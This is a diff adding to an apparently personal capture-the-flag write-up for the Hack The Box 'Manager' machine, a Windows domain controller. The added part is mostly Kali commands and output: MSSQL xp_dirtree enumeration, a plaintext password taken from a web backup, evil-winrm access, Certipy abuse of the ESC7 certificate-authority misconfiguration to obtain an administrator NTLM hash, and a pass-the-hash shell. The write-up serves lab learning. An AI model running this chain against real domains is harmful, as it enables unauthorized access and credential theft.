@@ -8,10 +8,42 @@ tags:
 - Solved : 2024.11.28. (Thu) (Takes 2days)
 ### Summary
 ---
+1. **Initial Enumeration**
 
+	- **Open Ports**: Identified critical services such as DNS, HTTP, Kerberos, LDAP, SMB, MSSQL, and WinRM.
+	- **DNS Enumeration**:
+	    - Discovered the domain `manager.htb` and hostname `dc01.manager.htb`.
+	- **SMB**:
+	    - Found readable shares, including `SYSVOL`, which provided domain-related files.
+    
+2. **Web Exploitation**
 
-### Key Techniques:
+	- Explored the HTTP service and identified a backup file via directory enumeration.
+	- Extracted sensitive information from the backup, including valid user credentials.
+	
+3. **Service Access**
+	
+	- **WinRM**:
+	    - Used extracted credentials to gain access to the system through WinRM.
+	    - 
+4. **Privilege Escalation**
 
+	- **MSSQL Exploitation**:
+	    - Enumerated directories on the server using MSSQL's `xp_dirtree` feature to find sensitive files.
+	- **AD CS Exploitation**:
+	    - Leveraged Active Directory Certificate Services (AD CS) misconfiguration (ESC7) to:
+	        - Escalate user permissions to enable vulnerable templates.
+	        - Request and issue a certificate for a privileged account.
+	- **NTLM Hash Abuse**:
+	    - Used the issued certificate to retrieve the NTLM hash of a privileged account and authenticate directly.
+
+---
+
+### Key Techniques
+
+- **Enumeration**: Thoroughly enumerated web services, SMB shares, and AD features.
+- **AD CS Exploitation**: Identified and abused certificate authority misconfigurations for privilege escalation.
+- **Credential Abuse**: Leveraged valid credentials and NTLM hash to gain higher privileges.
 
 
 # Reconnaissance
@@ -578,3 +610,400 @@ getting file \manager.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHIN
 No useful information is found here. I think it's time to move to other services.
 With the owned credential, let's try to access other services..
 
+##### Password policy
+
+```bash
+┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
+└─$ ldapsearch -x -H ldap://10.10.11.236 -D "operator@manager.htb" -w 'operator' -b "dc=manager,dc=htb" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength 
+forceLogoff: -9223372036854775808
+lockoutDuration: -18000000000
+lockOutObservationWindow: -18000000000
+lockoutThreshold: 0
+maxPwdAge: -36288000000000
+minPwdAge: -864000000000
+minPwdLength: 7
+modifiedCountAtLastProm: 0
+nextRid: 1000
+pwdProperties: 0
+pwdHistoryLength: 24
+```
+
+##### Kerberoasting & AS-REProasting & Secretsdump
+
+```bash
+┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
+└─$ impacket-GetUserSPNs manager.htb/operator:'operator' -dc-ip 10.10.11.236
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+No entries found!
+
+┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
+└─$ impacket-GetNPUsers manager.htb/operator:'operator' -dc-ip 10.10.11.236
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+No entries found!
+
+┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
+└─$ impacket-secretsdump manager.htb/operator:operator@10.10.11.236
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+```
+
+None of these are working..
+I think usual AD attack methods are not working for now.
+Let's tamper MS SQL this time.
+
+
+# Shell as `raven`
+
+```bash
+┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
+└─$ impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (MANAGER\Operator  guest@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    show_query                 - show query
+    mask_query                 - mask query
+    
+SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
+ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
+```
+
+It's working with `impacket-mssqlcient`. 
+But `xp_cmdshell` command is not working. I tried `enable_xp_cmdshell`, but it was not allowed.
+Let's try with different command `xp_dirtree`.
+
+```sql
+SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+Documents and Settings          1      0   
+inetpub                         1      0   
+PerfLogs                        1      0   
+Program Files                   1      0   
+Program Files (x86)             1      0   
+ProgramData                     1      0   
+Recovery                        1      0   
+SQL2019                         1      0   
+System Volume Information       1      0   
+Users                           1      0   
+Windows                         1      0   
+
+SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
+subdirectory                      depth   file   
+-------------------------------   -----   ----   
+about.html                            1      1   
+contact.html                          1      1   
+css                                   1      0   
+images                                1      0   
+index.html                            1      1   
+js                                    1      0   
+service.html                          1      1   
+web.config                            1      1   
+website-backup-27-07-23-old.zip       1      1
+```
+
+Since the file is located on the same folder with web source files, I think we can directly access to this file through http(80) method.
+Let's download the backup file and see what's in it.
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ wget http://manager.htb/website-backup-27-07-23-old.zip
+--2024-11-28 06:59:27--  http://manager.htb/website-backup-27-07-23-old.zip
+Resolving manager.htb (manager.htb)... 10.10.11.236
+Connecting to manager.htb (manager.htb)|10.10.11.236|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1045328 (1021K) [application/x-zip-compressed]
+Saving to: ‘website-backup-27-07-23-old.zip’
+
+website-backup-27- 100%[===============>]   1021K   234KB/s    in 6.6s    
+
+2024-11-28 06:59:34 (154 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
+
+
+┌──(kali㉿kali)-[~/htb/backup]
+└─$ grep -i 'password' -r .
+
+./js/jquery-3.4.1.min.js:!function(e,t){"use strict";"object"==typeof modul
+<SNIP>
+./.old-conf.xml:         <password>R4v3nBe5tD3veloP3r!123</password>
+
+┌──(kali㉿kali)-[~/htb/backup]
+└─$ cat .old-conf.xml 
+<?xml version="1.0" encoding="UTF-8"?>
+<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+   <server>
+      <host>dc01.manager.htb</host>
+      <open-port enabled="true">389</open-port>
+      <secure-port enabled="false">0</secure-port>
+      <search-base>dc=manager,dc=htb</search-base>
+      <server-type>microsoft</server-type>
+      <access-user>
+         <user>raven@manager.htb</user>
+         <password>R4v3nBe5tD3veloP3r!123</password>
+      </access-user>
+      <uid-attribute>cn</uid-attribute>
+   </server>
+   <search type="full">
+      <dir-list>
+         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+      </dir-list>
+   </search>
+</ldap-conf>
+```
+
+Here I can find `raven`'s password : `R4v3nBe5tD3veloP3r!123`
+Let's test what I can do with this credential.
+
+```bash
+┌──(kali㉿kali)-[~/htb/backup]
+└─$ crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
+
+┌──(kali㉿kali)-[~/htb/backup]
+└─$ crackmapexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
+HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
+WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
+```
+
+At this time, this credential is working on `winrm` as well. So we can open a shell through `evil-winrm` this time.
+
+```bash
+┌──(kali㉿kali)-[~/htb/share_sysvol/manager.htb]
+└─$ evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+  
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                 
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Raven\Documents>
+```
+
+
+# Shell as `administrator`
+
+With a Windows domain, the next thing to check used to be Bloodhound, but lately it’s worth checking Advice Directory Certificate Services (ADCS) as well, and that’s quick, so I’ll start there. This can be done by uploading [Certify](https://github.com/GhostPack/Certify) or remotely with [Certipy](https://github.com/ly4k/Certipy). I find Certipy easier.
+
+Here's the related article:
+<https://book.hacktricks.xyz/kr/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation>
+
+```bash
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
+[*] Got CA configuration for 'manager-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : manager-DC01-CA
+    DNS Name                            : dc01.manager.htb
+    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
+    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : MANAGER.HTB\Administrators
+      Access Rights
+        Enroll                          : MANAGER.HTB\Operator
+                                          MANAGER.HTB\Authenticated Users
+                                          MANAGER.HTB\Raven
+        ManageCertificates              : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+        ManageCa                        : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+                                          MANAGER.HTB\Raven
+    [!] Vulnerabilities
+      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+
+The result says that the user `raven` has dangerous permission `ESC7`.
+
+Based on `ESC7 - Attack2` method explained in the reference above, let's try abusing the permission.
+First, I need to add `raven` itself to the CA manager permission group.
+
+```bash
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+```
+
+Then, let's check `SubCA` template, and activate it if it's disabled.
+
+```bash
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[-] No action specified
+                                                                           
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+```
+
+Then, check if the template is successfully added.
+
+```bash
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Enabled certificate templates on 'manager-dc01-ca':
+    SubCA
+    DirectoryEmailReplication
+    DomainControllerAuthentication
+    KerberosAuthentication
+    EFSRecovery
+    EFS
+    DomainController
+    WebServer
+    Machine
+    User
+    Administrator
+```
+
+
+Then, using the `SubCA` template, let's request certificate.
+
+```vbnet
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 20
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 20.key
+[-] Failed to request certificate
+```
+
+It is expected to be failed based on the article. Anyway, I can check the Request ID is 20.
+
+```bash
+┌──(kali㉿kali)-[~/htb/Certipy]
+└─$ certipy ca -ca manager-DC01-CA -issue-request 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+
+[*] Successfully issued certificate
+```
+
+Now the issued certificate can be retrieved using `req` command.
+
+```bash
+certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)    
+                                                                    
+[*] Rerieving certificate with ID 20          
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '20.key'                     
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Then, let's try using it.
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236                                   
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@manager.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+```
+
+Here I can extract NTLM hash : `ae5064c2f62317332c88629e025924ef`
+Let's try cracking this hash using `hashcat`
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt.gz
+
+<SNIP>
+Session..........: hashcat                                
+Status...........: Exhausted
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: ae5064c2f62317332c88629e025924ef
+Time.Started.....: Thu Nov 28 08:49:42 2024 (2 secs)
+Time.Estimated...: Thu Nov 28 08:49:44 2024 (0 secs)
+<SNIP>
+```
+
+It's not crackable... but still we can use the NTLM hash itself.
+Let's try opening a shell using `evil-winrm`.
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ evil-winrm -i 10.10.11.236 -u administrator -H 'ae5064c2f62317332c88629e025924ef'
+ 
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                 
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+manager\administrator
+```
+
+Yeah, now I have a shell!
